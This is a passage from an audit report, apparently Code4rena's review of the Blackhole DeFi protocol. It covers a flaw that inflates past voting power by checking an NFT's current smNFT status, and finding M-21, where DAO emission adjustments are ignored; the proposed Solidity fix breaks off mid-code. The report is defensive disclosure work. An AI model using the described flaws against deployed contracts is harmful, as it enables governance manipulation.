class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Sum votes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echeckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_checkIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisSMNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Use the provided input timestamp here to get the right decay\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e =\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e +\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eVotingBalanceLogic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOfNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotingBalanceLogicData\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see in the snippet above that if specific token is not smNFT \u003cstrong\u003eRIGHT NOW\u003c/strong\u003e (as locked mapping stores current state of \u003ccode\u003etokenId\u003c/code\u003e); it skips its voting power in the calculation. However,  the function \u003cstrong\u003eDOES NOT\u003c/strong\u003e take into the consideration that specific \u003ccode\u003etokenId\u003c/code\u003e can be smNFT right now, but could be permanent/not permanent NFT at \u003ccode\u003etimestamp - timestamp\u003c/code\u003e. This means that if some NFTs at \u003ccode\u003etimestamp X\u003c/code\u003e was not-permanent locked position, now it’s smNFT (it is possible inside the VotingEscrow to update NFTs to smNFTs), the voting power from the \u003ccode\u003etimestamp X\u003c/code\u003e will be added to the \u003ccode\u003evotes\u003c/code\u003e variable calculation which is incorrect as at this point in time X, the nft WAS NOT smNFT.\u003c/p\u003e\n\u003cp\u003eThe biggest impact here is that \u003ccode\u003eBlackGovernor\u003c/code\u003e contract uses the \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e to determine the voting power of the account at some point in time (and the calculation is incorrect). This leads to some users having calculated bigger voting power than they should have leading to for example proposals being proposed from users who SHOULD NOT have that ability or votes casted using bigger power than actual.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eWhen calculating check whether at \u003ccode\u003etimestamp\u003c/code\u003e NFT was actually smNFT.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-64\"\u003emaxvzuvex\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-55\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\" style=\"position:relative;\"\u003e\u003ca href=\"#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\" aria-label=\"m 21 governance emission adjustment ignored when weekly emission above tail threshold permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-270\"\u003e[M-21] Governance emission adjustment ignored when weekly emission above tail threshold\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-82\"\u003evesko210\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-482\"\u003ecodexNature\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-424\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/MinterUpgradeable.sol#L169-#L180\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"summary-1\" style=\"position:relative;\"\u003e\u003ca href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h3\u003e\n\u003cp\u003eThe protocol only applies the DAO-controlled \u003ccode\u003etailEmissionRate\u003c/code\u003e when the weekly emission drops below \u003ccode\u003eTAIL_START\u003c/code\u003e. This prevents governance from influencing emissions during the intended phase (epoch ≥ 67), which contradicts the documented behavior and severely limits DAO control.\u003c/p\u003e\n\u003ch3 id=\"finding-description-11\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-11\" aria-label=\"finding description 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description\u003c/h3\u003e\n\u003cp\u003eIn the current implementation of \u003ccode\u003eupdate_period()\u003c/code\u003e, the weekly emission is multiplied by \u003ccode\u003etailEmissionRate\u003c/code\u003e \u003cstrong\u003eonly when\u003c/strong\u003e \u003ccode\u003e_weekly \u0026#x3C; TAIL_START\u003c/code\u003e. This logic is meant to apply the DAO’s voted emission adjustment in the governance-controlled phase (from epoch 67 onwards). However, this condition prevents DAO influence if emissions remain above \u003ccode\u003eTAIL_START\u003c/code\u003e, effectively locking the emission rate even after governance takes over.\u003c/p\u003e\n\u003cp\u003eThis violates the protocol’s documented guarantee:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“On and after the 67th epoch, it relies on the Governance DAO. If the DAO votes in favor, it increases by 1% of the previous epoch’s emission; if the proposal is against, emission will decrease by 1%; else it will remain the same.”\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eBecause the DAO’s control is blocked when \u003ccode\u003e_weekly \u003e= TAIL_START\u003c/code\u003e, the contract fails to fulfill its core governance mechanism — undermining decentralization, community control, and emission responsiveness.\u003c/p\u003e\n\u003ch3 id=\"impact-12\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-12\" aria-label=\"impact 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact is \u003cstrong\u003eHigh\u003c/strong\u003e. The protocol enters a governance phase after epoch 66, but the DAO’s vote is ignored unless emissions are below a fixed threshold. This means DAO proposals may appear to pass, but have no effect - creating a false sense of control. It limits emission modulation, disrupts monetary policy, and could erode community trust.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the \u003ccode\u003eif (_weekly \u0026#x3C; TAIL_START)\u003c/code\u003e conditional and apply \u003ccode\u003etailEmissionRate\u003c/code\u003e unconditionally when \u003ccode\u003eepochCount \u003e= 67\u003c/code\u003e, as per the documentation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_initializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eactive_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_period\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_emission\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 1: Epochs 1–14 (inclusive) — 3% growth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e15\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWEEKLY_GROWTH\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 2: Epochs 15–66 (inclusive) — 1% growth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eepochCount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e67\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Phase 3: Epochs 67+ — DAO governance control via nudge()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Apply governance-controlled tailEmissionRate from prior 